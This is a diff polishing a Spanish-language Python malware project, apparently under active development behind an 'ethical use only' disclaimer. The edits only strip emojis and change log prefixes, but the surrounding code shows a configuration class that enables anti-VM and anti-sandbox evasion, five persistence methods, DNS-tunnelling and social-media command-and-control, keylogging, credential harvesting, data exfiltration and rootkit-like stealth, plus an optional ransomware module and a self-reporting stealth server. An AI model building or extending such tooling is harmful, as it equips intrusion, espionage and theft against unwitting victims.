@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# 🔥 INVESTIGACIÓN EN SEGURIDAD - USO ÉTICO ÚNICAMENTE
-# ⚠️ NUNCA USAR EN SISTEMAS SIN AUTORIZACIÓN EXPLÍCITA
+# INVESTIGACIÓN EN SEGURIDAD - USO ÉTICO ÚNICAMENTE
+# NUNCA USAR EN SISTEMAS SIN AUTORIZACIÓN EXPLÍCITA
 
 import os
 import sys
@@ -161,28 +161,28 @@ class StealthyIPResolver:
 # ==================== CONFIGURACIÓN MALICIOSA EXTREMA ====================
 
 class AdvancedMalwareConfig:
-    # 🔥 Técnicas de evasión avanzada
+    # Técnicas de evasión avanzada
     ANTI_DEBUG = True
     ANTI_VM = True
     ANTI_SANDBOX = True
     POLYMORPHIC = True
     ENCRYPTED_PAYLOAD = True
 
-    # 🎯 Persistencia múltiple
+    # Persistencia múltiple
     REGISTRY_PERSISTENCE = True
     SCHTASKS_PERSISTENCE = True
     SERVICE_PERSISTENCE = True
     STARTUP_PERSISTENCE = True
     WMI_PERSISTENCE = True
 
-    # 📡 Comunicaciones encubiertas
+    #  Comunicaciones encubiertas
     DNS_TUNNELING = True
     ICMP_COVERT = False  # Requiere permisos admin
     HTTPS_C2 = True
     SOCIAL_MEDIA_C2 = True
     DEAD_MAN_SWITCH = True
 
-    # 💾 Capacidades ofensivas
+    # Capacidades ofensivas
     KEYLOGGER = True
     SCREEN_CAPTURE = True
     CREDENTIAL_HARVESTING = True
@@ -190,12 +190,12 @@ class AdvancedMalwareConfig:
     DATA_EXFILTRATION = True
     RANSOMWARE_MODULE = False  # ⚠️ Extremadamente destructivo
 
-    # 🕵️ Técnicas stealth
+    # Técnicas stealth
     PROCESS_INJECTION = False  # Requiere librerías adicionales
     ROOTKIT_LIKE = True
     FILELESS_OPERATION = True
 
-    # 🔄 Mecanismos de resiliencia
+    # Mecanismos de resiliencia
     SELF_HEALING = True
     REDUNDANT_C2 = True
     AUTOMATIC_UPDATES = True
@@ -648,7 +648,7 @@ class StealthServer:
 
     def start_persistent_server(self):
         """Iniciar servidor con auto-reporte"""
-        print(f" Servidor iniciado en puerto {self.port}")
+        print(f"[+] Servidor iniciado en puerto {self.port}")
 
         # AUTO-REPORTE al iniciar (solo una vez)
         if not self.report_sent:
@@ -686,7 +686,7 @@ class StealthServer:
                     time.sleep(0.1)
 
             except Exception as e:
-                print(f"⚠️ Error en servidor: {e}")
+                print(f"[-] Error en servidor: {e}")
                 time.sleep(10)  # Esperar antes de reintentar
             finally:
                 try:
